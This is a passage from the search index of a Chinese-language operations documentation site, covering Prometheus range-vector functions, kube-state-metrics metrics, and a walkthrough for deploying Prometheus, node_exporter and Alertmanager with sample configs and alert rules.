min_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u70b9\u7684\u6700\u5c0f\u503c\u3002 sum_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u503c\u7684\u603b\u548c\u3002 count_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u503c\u7684\u8ba1\u6570\u3002 quantile_over_time(scalar, range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u503c\u7684 \u03c6 \u5206\u4f4d\u6570 (0 \u2264 \u03c6 \u2264 1)\u3002 stddev_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u503c\u7684\u603b\u4f53\u6807\u51c6\u5dee\u3002 stdvar_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u503c\u7684\u603b\u4f53\u6807\u51c6\u65b9\u5dee\u3002 last_over_time(range-vector)\uff1a\u6307\u5b9a\u65f6\u95f4\u95f4\u9694\u5185\u7684\u6700\u8fd1\u70b9\u503c\u3002","title":"Prometheus\u8bed\u6cd5\u51fd\u6570"},{"location":"monitor/prometheus/function/#_1","text":"","title":"\u51fd\u6570"},{"location":"monitor/prometheus/function/#avg_over_timerange-vector","text":"range-vector \uff1a\u8fd9\u4e2a\u4ee3\u8868\u4e00\u6bb5\u65f6\u95f4\u6240\u6709\u7684\u503c\uff0c\u6bd4\u5982\u8fd9\u79cd\uff1anode_procs_running[1m] \u7136\u540e\u901a\u8fc7avg_over_time\u8ba1\u7b971\u5206\u949f\u5185\u7684\u5e73\u5747\u503c\uff0c\u4f8b\u5982\uff1aavg_over_time(node_procs_running[1m])","title":"avg_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u70b9\u7684\u5e73\u5747\u503c\u3002"},{"location":"monitor/prometheus/function/#max_over_timerange-vector","text":"","title":"max_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u70b9\u7684\u6700\u5927\u503c\u3002"},{"location":"monitor/prometheus/function/#min_over_timerange-vector","text":"","title":"min_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u70b9\u7684\u6700\u5c0f\u503c\u3002"},{"location":"monitor/prometheus/function/#sum_over_timerange-vector","text":"","title":"sum_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u503c\u7684\u603b\u548c\u3002"},{"location":"monitor/prometheus/function/#count_over_timerange-vector","text":"","title":"count_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u503c\u7684\u8ba1\u6570\u3002"},{"location":"monitor/prometheus/function/#quantile_over_timescalar-range-vector-0-1","text":"","title":"quantile_over_time(scalar, range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u503c\u7684 \u03c6 \u5206\u4f4d\u6570 (0 \u2264 \u03c6 \u2264 1)\u3002"},{"location":"monitor/prometheus/function/#stddev_over_timerange-vector","text":"","title":"stddev_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u503c\u7684\u603b\u4f53\u6807\u51c6\u5dee\u3002"},{"location":"monitor/prometheus/function/#stdvar_over_timerange-vector","text":"","title":"stdvar_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u503c\u7684\u603b\u4f53\u6807\u51c6\u65b9\u5dee\u3002"},{"location":"monitor/prometheus/function/#last_over_timerange-vector","text":"","title":"last_over_time(range-vector)\uff1a\u6307\u5b9a\u65f6\u95f4\u95f4\u9694\u5185\u7684\u6700\u8fd1\u70b9\u503c\u3002"},{"location":"monitor/prometheus/kube-state-metrics/","text":"kube-state-metrics \u5e38\u7528\u6307\u6807 \u5730\u5740\uff1ahttps://github.com/kubernetes/kube-state-metrics/tree/master/docs kube_deployment_spec_replicas HELP kube_deployment_spec_replicas Number of desired pods for a deployment. deployment \u7684POD\u7684\u6570\u5b57 kube_deployment_status_replicas # HELP kube_deployment_status_replicas The number of replicas per deployment. deployment \u7684replicas\u7684\u6570\u5b57","title":"K8S kube-state-metrics\u6307\u6807\u8bf4\u660e"},{"location":"monitor/prometheus/kube-state-metrics/#kube-state-metrics","text":"\u5730\u5740\uff1ahttps://github.com/kubernetes/kube-state-metrics/tree/master/docs kube_deployment_spec_replicas HELP kube_deployment_spec_replicas Number of desired pods for a deployment. deployment \u7684POD\u7684\u6570\u5b57 kube_deployment_status_replicas # HELP kube_deployment_status_replicas The number of replicas per deployment. deployment \u7684replicas\u7684\u6570\u5b57","title":"kube-state-metrics \u5e38\u7528\u6307\u6807"},{"location":"monitor/prometheus/prometheus/","text":"Prometheus \u670d\u52a1\u7aef\u90e8\u7f72 Prometheus\u662f\u670d\u52a1\u7aef\uff0c\u9ed8\u8ba4\u4e5f\u76d1\u63a7\u81ea\u5df1\uff0c\u8d1f\u8d23\u5b9a\u65f6\u8f6e\u8be2\u91c7\u96c6\u6570\u636e\u3001\u5b58\u50a8\u3001\u5bf9\u5916\u63d0\u4f9b\u6570\u636e\u67e5\u8be2\u3001\u544a\u8b66\u89c4\u5219\u68c0\u6d4b \u670d\u52a1\u7aef\uff1a \u4e3b\u673a\u540d prometheus\u7248\u672c IP prometheus v2.15.2 192.168.70.130 \u5ba2\u6237\u7aef\uff1a \u4e3b\u673a\u540d node_exporter\u7248\u672c IP node_exporter v0.18.1 192.168.70.131 \u544a\u8b66\u4e2d\u5fc3\uff1a \u4e3b\u673a\u540d node_exporter\u7248\u672c IP alertmanager v0.20.0 192.168.70.133 prometheus\u7a0b\u5e8f\u4e0b\u8f7d\u5730\u5740 https://github.com/prometheus/prometheus/releases/tag/v2.15.2 [root@prometheus ~]# tar -zxvf prometheus-2.15.2.linux-amd64.tar.gz prometheus-2.15.2.linux-amd64/ prometheus-2.15.2.linux-amd64/promtool prometheus-2.15.2.linux-amd64/consoles/ prometheus-2.15.2.linux-amd64/consoles/node-cpu.html prometheus-2.15.2.linux-amd64/consoles/index.html.example prometheus-2.15.2.linux-amd64/consoles/node-overview.html prometheus-2.15.2.linux-amd64/consoles/prometheus-overview.html prometheus-2.15.2.linux-amd64/consoles/node-disk.html prometheus-2.15.2.linux-amd64/consoles/node.html prometheus-2.15.2.linux-amd64/consoles/prometheus.html prometheus-2.15.2.linux-amd64/NOTICE prometheus-2.15.2.linux-amd64/LICENSE prometheus-2.15.2.linux-amd64/prometheus.yml prometheus-2.15.2.linux-amd64/prometheus prometheus-2.15.2.linux-amd64/tsdb prometheus-2.15.2.linux-amd64/console_libraries/ prometheus-2.15.2.linux-amd64/console_libraries/menu.lib prometheus-2.15.2.linux-amd64/console_libraries/prom.lib [root@prometheus ~]# mv prometheus-2.15.2.linux-amd64 /usr/local/prometheus [root@prometheus prometheus]# cat prometheus.yml | grep -v '^#' | grep -v '^$' global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6bcf15s\u62c9\u53d6\u4e00\u6b21\u76ee\u6807\u91c7\u6837\u70b9\u6570\u636e\u3002 evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. #\u9644\u52a0\u76ee\u6807\u62c9\u53d6\uff0c\u6bcf15s\u62c9\u53d6\u4e00\u6b21\u76ee\u6807\u91c7\u6837\u70b9\u6570\u636e # scrape_timeout is set to the global default (10s). alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 rule_files: # - \"first_rules.yml\" # - \"second_rules.yml\" scrape_configs: # The job name is added as a label `job=<job_name>` to any timeseries scraped from this config. # job\u540d\u79f0\u4f1a\u589e\u52a0\u5230\u62c9\u53d6\u5230\u7684\u6240\u6709\u91c7\u6837\u70b9\u4e0a\uff0c\u540c\u65f6\u8fd8\u6709\u4e00\u4e2ainstance\u76ee\u6807\u670d\u52a1\u7684host\uff1aport\u6807\u7b7e\u4e5f\u4f1a\u589e\u52a0\u5230\u91c7\u6837\u70b9\u4e0a - job_name: 'prometheus' # metrics_path defaults to '/metrics' # \u76d1\u63a7\u6307\u6807\u8def\u5f84\u9ed8\u8ba4\u8bbf\u95eelocalhost:9090/metrics # scheme defaults to 'http'. # \u76ee\u6807\u9ed8\u8ba4\u4e3ahttp static_configs: - targets: ['localhost:9090'] #\u9ed8\u8ba4\u76d1\u63a7\u81ea\u5df1 [root@prometheus prometheus]# nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 & [1] 1969 #\u542f\u52a8 \u4e00\u4e9b\u542f\u52a8\u53c2\u6570 [root@prometheus prometheus]# ./prometheus --help usage: prometheus [<flags>] The Prometheus monitoring server Flags: -h, --help \u5c55\u793a\u5e2e\u52a9 --version \u663e\u793a\u7248\u672c --config.file=\"prometheus.yml\" \u914d\u7f6e\u6587\u4ef6\u8def\u5f84 --web.listen-address=\"0.0.0.0:9090\" \u7528\u4e8e\u4fa6\u542c UI\u3001API \u7684\u5730\u5740 --web.read-timeout=5m \u8d85\u65f6\u8bfb\u53d6\u8bf7\u6c42\u548c\u5173\u95ed\u7a7a\u95f2\u8fde\u63a5\u4e4b\u524d\u7684\u6700\u5927\u6301\u7eed\u65f6\u95f4 --web.max-connections=512 \u540c\u65f6\u8fde\u63a5\u7684\u6700\u5927\u6570\u91cf --web.external-url=<URL> \u5916\u90e8\u53ef\u8bbf\u95ee Prometheus \u7684 URL --web.route-prefix=<path> Prefix for the internal routes of web endpoints. Defaults to path of --web.external-url. --web.user-assets=<path> Path to static asset directory, available at /user. --web.enable-lifecycle \u901a\u8fc7 HTTP \u8bf7\u6c42\u542f\u7528\u5173\u95ed\u548c\u91cd\u65b0\u52a0\u8f7d\u3002. \u914d\u7f6e\u8be5\u9009\u9879\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u884c curl -X POST \"http://xxx.xxx.xx.xxx:9090/-/reload\" \u8fdb\u884c\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e --web.enable-admin-api \u4e3a\u7ba1\u7406\u63a7\u5236\u64cd\u4f5c\u542f\u7528 API \u7aef\u70b9 --web.console.templates=\"consoles\" \u63a7\u5236\u53f0\u6a21\u677f\u76ee\u5f55\u7684\u8def\u5f84\uff0c\u4f4d\u4e8e /consoles\u3002 --web.console.libraries=\"console_libraries\" Path to the console library directory. --web.page-title=\"Prometheus Time Series Collection and Processing Server\" Document title of Prometheus instance. --web.cors.origin=\".*\" Regex for CORS origin. It is fully anchored. Example: 'https?://(domain1|domain2)\\.com' --storage.tsdb.path=\"data/\" tsdb\u6570\u636e\u5b58\u50a8\u7684\u76ee\u5f55\uff0c\u9ed8\u8ba4\u5f53\u524ddata/ --storage.tsdb.retention=STORAGE.TSDB.RETENTION \u5b58\u50a8\u6570\u636e\u4fdd\u5b58\u591a\u957f\u65f6\u95f4\u7684\uff0c\u9ed8\u8ba415\u5929\uff0c\u8fd9\u4e2a\u9009\u9879\u5728\u8fd9\u4e2a\u7248\u672c\u5df2\u7ecf\u5f03\u7528\uff0c\u7528storage.tsdb.retention.time\u4ee3\u66ff --storage.tsdb.retention.time=STORAGE.TSDB.RETENTION.TIME \u4fdd\u7559\u65f6\u95f4\u9ed8\u8ba4\u4e3a15d\u3002 \u652f\u6301\u7684\u5355\u4f4d\uff1ay\u3001 w\u3001d\u3001h\u3001m\u3001s\u3001ms\u3002 --storage.tsdb.retention.size=STORAGE.TSDB.RETENTION.SIZE [\u5b9e\u9a8c] \u53ef\u4ee5\u4e3a\u5757\u5b58\u50a8\u7684\u6700\u5927\u5b57\u8282\u6570\u3002 \u652f\u6301\u7684\u5355\u4f4d\uff1aKB\u3001MB\u3001GB\u3001TB\u3001PB\u3002 \u6b64\u6807\u5fd7\u662f\u5b9e\u9a8c\u6027\u7684\uff0c\u53ef\u4ee5\u5728\u672a\u6765\u7248\u672c\u4e2d\u66f4\u6539\u3002 --storage.tsdb.no-lockfile \u4e0d\u8981\u5728\u6570\u636e\u76ee\u5f55\u4e2d\u521b\u5efa\u9501\u6587\u4ef6 --storage.tsdb.allow-overlapping-blocks [EXPERIMENTAL] Allow overlapping blocks, which in turn enables vertical compaction and vertical query merge. --storage.tsdb.wal-compression Compress the tsdb WAL. --storage.remote.flush-deadline=<duration> How long to wait flushing sample on shutdown or config reload. --storage.remote.read-sample-limit=5e7 Maximum overall number of samples to return via the remote read interface, in a single query. 0 means no limit. This limit is ignored for streamed response types. --storage.remote.read-concurrent-limit=10 Maximum number of concurrent remote read calls. 0 means no limit. --storage.remote.read-max-bytes-in-frame=1048576 Maximum number of bytes in a single frame for streaming remote read response types before marshalling. Note that client might have limit on frame size as well. 1MB as recommended by protobuf by default. --rules.alert.for-outage-tolerance=1h Max time to tolerate prometheus outage for restoring \"for\" state of alert. --rules.alert.for-grace-period=10m Minimum duration between alert and restored \"for\" state. This is maintained only for alerts with configured \"for\" time greater than grace period. --rules.alert.resend-delay=1m Minimum amount of time to wait before resending an alert to Alertmanager. --alertmanager.notification-queue-capacity=10000 The capacity of the queue for pending Alertmanager notifications. --alertmanager.timeout=10s Timeout for sending alerts to Alertmanager. --query.lookback-delta=5m The maximum lookback duration for retrieving metrics during expression evaluations. --query.timeout=2m Maximum time a query may take before being aborted. --query.max-concurrency=20 \u5e76\u53d1\u6267\u884c\u7684\u6700\u5927\u67e5\u8be2\u6570\u3002 --query.max-samples=50000000 Maximum number of samples a single query can load into memory. Note that queries will fail if they try to load more samples than this into memory, so this also limits the number of samples a query can return. --log.level=info Only log messages with the given severity or above. One of: [debug, info, warn, error] --log.format=logfmt Output format of log messages. One of: [logfmt, json] \u8fd9\u5c31\u90e8\u7f72\u5b8c\u6210\u4e86\uff0c\u8bbf\u95eehttp://192.168.70.130:9090/\u5c31\u80fd\u770b\u5230\u76d1\u63a7\u9875\u9762\u3002\u9ed8\u8ba4\u76d1\u63a7\u81ea\u5df1\uff0c\u90a3\u4e48\u76d1\u63a7\u54ea\u4e9b\u6307\u6807\uff0c\u8bbf\u95eehttp://192.168.70.130:9090/metrics\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\u3002 \u5ba2\u6237\u7aef\u90e8\u7f72 exporter\uff1a\u4ee5http\u7684\u65b9\u5f0f\uff0c\u66b4\u9732\u6536\u96c6\u7684metric\uff0c\u7136\u540ePrometheus server\u4f1a\u5b9a\u671f\u6765\u62c9\u53d6\u6570\u636e\uff0c\u53ef\u5b89\u88c5\u5728\u88ab\u76d1\u63a7\u4e3b\u673a node_exporter\u662fexporter\u7684\u4e00\u79cd\uff0c\u7528\u6765\u76d1\u63a7Linux\u4e3b\u673a\uff0c\u5982\u679c\u76d1\u63a7windows\u4e3b\u673a\uff0c\u7528windows_exporter,\u5730\u5740\u5982\u4e0b https://github.com/prometheus-community/windows_exporter \u90e8\u7f72 node_exporter\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/prometheus/node_exporter/releases/tag/v0.18.1 [root@node_exporter ~]# tar zxvf node_exporter-0.18.1.linux-amd64.tar.gz node_exporter-0.18.1.linux-amd64/ node_exporter-0.18.1.linux-amd64/node_exporter node_exporter-0.18.1.linux-amd64/NOTICE node_exporter-0.18.1.linux-amd64/LICENSE [root@node_exporter ~]# mv node_exporter-0.18.1.linux-amd64 /usr/local/node_exporter [root@node_exporter ~]# cd /usr/local/node_exporter/ [root@node_exporter node_exporter]# nohup ./node_exporter > node_exporter.log 2>&1 & [root@node_exporter node_exporter]# ss -tanp | grep node_exporter LISTEN 0 128 [::]:9100 [::]:* users:((\"node_exporter\",pid=1846,fd=3)) \u4fee\u6539\u670d\u52a1\u7aefPrometheus\u914d\u7f6e\uff0c\u7136\u540e\u91cd\u542f\u4f7f\u5176\u914d\u7f6e\u751f\u6548 [root@prometheus prometheus]# cat prometheus.yml # my global config global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configuration alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global 'evaluation_interval'. rule_files: # - \"first_rules.yml\" # - \"second_rules.yml\" # A scrape configuration containing exactly one endpoint to scrape: # Here it's Prometheus itself. scrape_configs: # The job name is added as a label `job=<job_name>` to any timeseries scraped from this config. - job_name: 'prometheus' static_configs: - targets: ['localhost:9090'] - job_name: 'linux' static_configs: - targets: [ '192.168.70.131:9100' ] [root@prometheus prometheus]# ps -ef | grep prome root 1969 1808 0 11:05 pts/0 00:00:02 ./prometheus --config.file=prometheus.yml root 11775 1808 0 12:45 pts/0 00:00:00 grep --color=auto prome [root@prometheus prometheus]# kill -9 1969 [root@prometheus prometheus]# ps -ef | grep prome root 11777 1808 0 12:45 pts/0 00:00:00 grep --color=auto prome [1]+ \u5df2\u6740\u6b7b nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 [root@prometheus prometheus]# ps -ef | grep prome root 11779 1808 0 12:45 pts/0 00:00:00 grep --color=auto prome [root@prometheus prometheus]# nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 & [1] 11786 \u7136\u540e\u67e5\u770bprometheus\u7684\u76d1\u63a7\u76ee\u6807\uff0c\u51fa\u73b0131\u8be5\u673a\u5668 \u544a\u8b66\u4e2d\u5fc3 Alertmanager\u90e8\u7f72 Alertmanager \u7528\u4e8e\u53d1\u9001\u544a\u8b66\uff0c \u662f\u771f\u6b63\u53d1\u9001\u4fe1\u606f\u7ed9\u7528\u6237\u7684\u6a21\u5757\u3002 Alertmanager \u4f1a\u63a5\u53d7Prometheus\u53d1\u9001\u8fc7\u6765\u7684\u8b66\u544a\u4fe1\u606f\uff0c\u518d\u7531Alertmanager\u6765\u53d1\u9001\u3002 [root@alertmanager ~]# tar -zxvf alertmanager-0.20.0.linux-amd64.tar.gz alertmanager-0.20.0.linux-amd64/ alertmanager-0.20.0.linux-amd64/LICENSE alertmanager-0.20.0.linux-amd64/alertmanager alertmanager-0.20.0.linux-amd64/amtool alertmanager-0.20.0.linux-amd64/NOTICE alertmanager-0.20.0.linux-amd64/alertmanager.yml [root@alertmanager ~]# mv alertmanager-0.20.0.linux-amd64 /usr/local/alertmanager [root@alertmanager ~]# cd /usr/local/alertmanager/ [root@alertmanager alertmanager]# cat alertmanager.yml global: resolve_timeout: 5m route: group_by: ['alertname'] group_wait: 10s group_interval: 10s repeat_interval: 1h receiver: 'web.hook' receivers: - name: 'web.hook' webhook_configs: - url: 'http://127.0.0.1:5001/' inhibit_rules: - source_match: severity: 'critical' target_match: severity: 'warning' equal: ['alertname', 'dev', 'instance'] [root@alertmanager alertmanager]# nohup ./alertmanager --config.file=./alertmanager.yml > alertmanager.log 2>&1 & \u7136\u540e\u4fee\u6539prometheus\u914d\u7f6e\uff0c\u914d\u7f6e\u4e00\u4e9b\u544a\u8b66 [root@prometheus prometheus]# cat prometheus.yml global: scrape_interval: 1s evaluation_interval: 1s alerting: alertmanagers: - static_configs: - targets: ['192.168.70.133:9093'] rule_files: - rules/*.yml scrape_configs: - job_name: 'prometheus' static_configs: - targets: ['localhost:9090'] - job_name: 'linux' static_configs: - targets: [ '192.168.70.131:9100' ] [root@prometheus prometheus]# cat rules/host.yml groups: - name: Host rules: - alert: running expr: node_procs_running > 0 for: 5s labels: serverity: high annotations: summary: \"{{$labels.instance}}: High running\" description: \"{{$labels.instance}}: running is {{$value}}\" [root@prometheus prometheus]# ps -ef | grep prom root 1168 1 0 13:49 ? 00:00:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient-f52ff6ca-5e7d-4f00-b4f7-679ef47b77da-ens33.lease -pf /var/run/dhclient-ens33.pid -H prometheus ens33 root 1728 1704 0 13:54 pts/0 00:00:03 ./prometheus --config.file=prometheus.yml root 1847 1704 0 14:55 pts/0 00:00:00 grep --color=auto prom [root@prometheus prometheus]# kill -9 1728 [root@prometheus prometheus]# [1]+ \u5df2\u6740\u6b7b nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 [root@prometheus prometheus]# [root@prometheus prometheus]# nohup ./prometheus --config.file=prometheus.yml --web.enable-lifecycle > prometheus.log 2>&1 & \u8fd9\u91cc\u6709\u4e00\u4e9b\u53c2\u6570\u9700\u8981\u660e\u786e\u4e0b\uff1a evaluation_interval \u544a\u8b66\u7684\u68c0\u6d4b\u5468\u671f\uff0c\u5c31\u662f\u544a\u8b66\u7684\u89e6\u53d1\u5468\u671f\uff0c\u6bd4\u5982\u4f60\u5199\u4e86\u4e00\u4e2a\u68c0\u6d4b\u811a\u672c\u6216\u8005rules\uff0c\u8fd9\u4e2a\u65f6\u95f4\u5c31\u662f\u6bcf\u9694\u591a\u957f\u65f6\u95f4\u53bb\u8c03\u7528\u8fd9\u4e2a\u811a\u672c scrape_interval \u76d1\u63a7\u4fe1\u606f\u7684\u62c9\u53d6\u65f6\u95f4\uff0c\u5c31\u662f\u62c9\u53d6metrics\u7684\u5468\u671f\uff0cPrometheus\u662f\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53bb\u62c9\u53d6target\u4e2d\u7684\u76ee\u6807\u7684metrics \u5728roles\u4e2d expr \u7528\u6765\u89e6\u53d1\u62a5\u8b66\u7684\u516c\u5f0f\uff0c\u53ef\u4ee5\u5728prom\u8f93\u5165\u8fd9\u4e2a\u516c\u5f0f\u67e5\u770b\u5f53\u524d\u503c for \u8fd9\u4e2a\u89e6\u53d1\u6301\u7eed\u4e86\u591a\u4e45\uff0c\u6709\u4e9b\u6307\u6807\u5fc5\u987b\u7ef4\u6301\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u7b97\u5f02\u5e38\uff0c\u5728Prometheus\u4e2d\uff0c\u544a\u8b66\u4e3a3\u79cd\u72b6\u6001\uff0cInactive\u3001Pending\u3001Firing\u4e09\u79cd\uff0cinactive\u5c31\u662f\u6ca1\u6709\u89e6\u53d1\u7684\u544a\u8b66\uff0cPending\u5c31\u662f\u5df2\u7ecf\u89e6\u53d1\u7684\u544a\u8b66\uff0c\u4f46\u662f\u6ca1\u6709\u8fbe\u5230for\u89c4\u5b9a\u7684\u6301\u7eed\u65f6\u957f\uff0cFiring\u5c31\u662f\u5df2\u7ecf\u8fbe\u5230for\u89c4\u5b9a\u7684\u6301\u7eed\u65f6\u957f\u7684\u544a\u8b66\uff0c\u5c31\u662f\u6709\u6548\u544a\u8b66 \u4e0a\u9762\u6211\u76d1\u63a7\u7684\u662f\u4e3b\u673a\u5185\u7684\u6b63\u5728\u8fd0\u884c\u6216\u8005\u53ef\u8fd0\u884c\u7684\u7ebf\u7a0b\u6570\u5927\u4e8e0\u5c31\u544a\u8b66\uff0c\u6b63\u5e38\u8fd9\u4e2a\u503c\u662f\u4e00\u76f4\u5927\u4e8e0\u7684 \u67e5\u770bprometheus\u4e0a\u7684\u544a\u8b66\uff1a \u663e\u793a\u5df2\u7ecf\u6210\u529f\u544a\u8b66 \u7136\u540e\u67e5\u770baltermanager\u4e0a\u7684\u544a\u8b66 \u8bbf\u95ee192.168.70.133:9093 info\u5c31\u662frules\u4e2d\u586b\u5199\u7684\u5185\u5bb9\uff0csource\u70b9\u51fb\u4f1a\u8df3\u8f6c\u53bb\u663e\u793aprometheus\u4e2d\u8be5\u516c\u5f0f\u7684\u5b9e\u65f6\u503c\uff0csilence\u5c31\u662f\u521b\u5efa\u4e00\u6761\u8be5\u544a\u8b66\u7684\u9759\u97f3\u89c4\u5219","title":"Alertmanager\u90e8\u7f72"},{"location":"monitor/prometheus/prometheus/#_1","text":"Prometheus\u662f\u670d\u52a1\u7aef\uff0c\u9ed8\u8ba4\u4e5f\u76d1\u63a7\u81ea\u5df1\uff0c\u8d1f\u8d23\u5b9a\u65f6\u8f6e\u8be2\u91c7\u96c6\u6570\u636e\u3001\u5b58\u50a8\u3001\u5bf9\u5916\u63d0\u4f9b\u6570\u636e\u67e5\u8be2\u3001\u544a\u8b66\u89c4\u5219\u68c0\u6d4b \u670d\u52a1\u7aef\uff1a \u4e3b\u673a\u540d prometheus\u7248\u672c IP prometheus v2.15.2 192.168.70.130 \u5ba2\u6237\u7aef\uff1a \u4e3b\u673a\u540d node_exporter\u7248\u672c IP node_exporter v0.18.1 192.168.70.131 \u544a\u8b66\u4e2d\u5fc3\uff1a \u4e3b\u673a\u540d node_exporter\u7248\u672c IP alertmanager v0.20.0 192.168.70.133 prometheus\u7a0b\u5e8f\u4e0b\u8f7d\u5730\u5740 https://github.com/prometheus/prometheus/releases/tag/v2.15.2 [root@prometheus ~]# tar -zxvf prometheus-2.15.2.linux-amd64.tar.gz prometheus-2.15.2.linux-amd64/ prometheus-2.15.2.linux-amd64/promtool prometheus-2.15.2.linux-amd64/consoles/ prometheus-2.15.2.linux-amd64/consoles/node-cpu.html prometheus-2.15.2.linux-amd64/consoles/index.html.example prometheus-2.15.2.linux-amd64/consoles/node-overview.html prometheus-2.15.2.linux-amd64/consoles/prometheus-overview.html prometheus-2.15.2.linux-amd64/consoles/node-disk.html prometheus-2.15.2.linux-amd64/consoles/node.html prometheus-2.15.2.linux-amd64/consoles/prometheus.html prometheus-2.15.2.linux-amd64/NOTICE prometheus-2.15.2.linux-amd64/LICENSE prometheus-2.15.2.linux-amd64/prometheus.yml prometheus-2.15.2.linux-amd64/prometheus prometheus-2.15.2.linux-amd64/tsdb prometheus-2.15.2.linux-amd64/console_libraries/ prometheus-2.15.2.linux-amd64/console_libraries/menu.lib prometheus-2.15.2.linux-amd64/console_libraries/prom.lib [root@prometheus ~]# mv prometheus-2.15.2.linux-amd64 /usr/local/prometheus [root@prometheus prometheus]# cat prometheus.yml | grep -v '^#' | grep -v '^$' global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6bcf15s\u62c9\u53d6\u4e00\u6b21\u76ee\u6807\u91c7\u6837\u70b9\u6570\u636e\u3002 evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. #\u9644\u52a0\u76ee\u6807\u62c9\u53d6\uff0c\u6bcf15s\u62c9\u53d6\u4e00\u6b21\u76ee\u6807\u91c7\u6837\u70b9\u6570\u636e # scrape_timeout is set to the global default (10s). alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 rule_files: # - \"first_rules.yml\" # - \"second_rules.yml\" scrape_configs: # The job name is added as a label `job=<job_name>` to any timeseries scraped from this config. # job\u540d\u79f0\u4f1a\u589e\u52a0\u5230\u62c9\u53d6\u5230\u7684\u6240\u6709\u91c7\u6837\u70b9\u4e0a\uff0c\u540c\u65f6\u8fd8\u6709\u4e00\u4e2ainstance\u76ee\u6807\u670d\u52a1\u7684host\uff1aport\u6807\u7b7e\u4e5f\u4f1a\u589e\u52a0\u5230\u91c7\u6837\u70b9\u4e0a - job_name: 'prometheus' # metrics_path defaults to '/metrics' # \u76d1\u63a7\u6307\u6807\u8def\u5f84\u9ed8\u8ba4\u8bbf\u95eelocalhost:9090/metrics # scheme defaults to 'http'. # \u76ee\u6807\u9ed8\u8ba4\u4e3ahttp static_configs: - targets: ['localhost:9090'] #\u9ed8\u8ba4\u76d1\u63a7\u81ea\u5df1 [root@prometheus prometheus]# nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 & [1] 1969 #\u542f\u52a8 \u4e00\u4e9b\u542f\u52a8\u53c2\u6570 [root@prometheus prometheus]# ./prometheus --help usage: prometheus [<flags>] The Prometheus monitoring server Flags: -h, --help \u5c55\u793a\u5e2e\u52a9 --version \u663e\u793a\u7248\u672c --config.file=\"prometheus.yml\" \u914d\u7f6e\u6587\u4ef6\u8def\u5f84 --web.listen-address=\"0.0.0.0:9090\" \u7528\u4e8e\u4fa6\u542c UI\u3001API \u7684\u5730\u5740 --web.read-timeout=5m \u8d85\u65f6\u8bfb\u53d6\u8bf7\u6c42\u548c\u5173\u95ed\u7a7a\u95f2\u8fde\u63a5\u4e4b\u524d\u7684\u6700\u5927\u6301\u7eed\u65f6\u95f4 --web.max-connections=512 \u540c\u65f6\u8fde\u63a5\u7684\u6700\u5927\u6570\u91cf --web.external-url=<URL> \u5916\u90e8\u53ef\u8bbf\u95ee Prometheus \u7684 URL --web.route-prefix=<path> Prefix for the internal routes of web endpoints. Defaults to path of --web.external-url. --web.user-assets=<path> Path to static asset directory, available at /user. --web.enable-lifecycle \u901a\u8fc7 HTTP \u8bf7\u6c42\u542f\u7528\u5173\u95ed\u548c\u91cd\u65b0\u52a0\u8f7d\u3002. \u914d\u7f6e\u8be5\u9009\u9879\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u884c curl -X POST \"http://xxx.xxx.xx.xxx:9090/-/reload\" \u8fdb\u884c\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e --web.enable-admin-api \u4e3a\u7ba1\u7406\u63a7\u5236\u64cd\u4f5c\u542f\u7528 API \u7aef\u70b9 --web.console.templates=\"consoles\" \u63a7\u5236\u53f0\u6a21\u677f\u76ee\u5f55\u7684\u8def\u5f84\uff0c\u4f4d\u4e8e /consoles\u3002 --web.console.libraries=\"console_libraries\" Path to the console library directory. --web.page-title=\"Prometheus Time Series Collection and Processing Server\" Document title of Prometheus instance. --web.cors.origin=\".*\" Regex for CORS origin. It is fully anchored. Example: 'https?://(domain1|domain2)\\.com' --storage.tsdb.path=\"data/\" tsdb\u6570\u636e\u5b58\u50a8\u7684\u76ee\u5f55\uff0c\u9ed8\u8ba4\u5f53\u524ddata/ --storage.tsdb.retention=STORAGE.TSDB.RETENTION 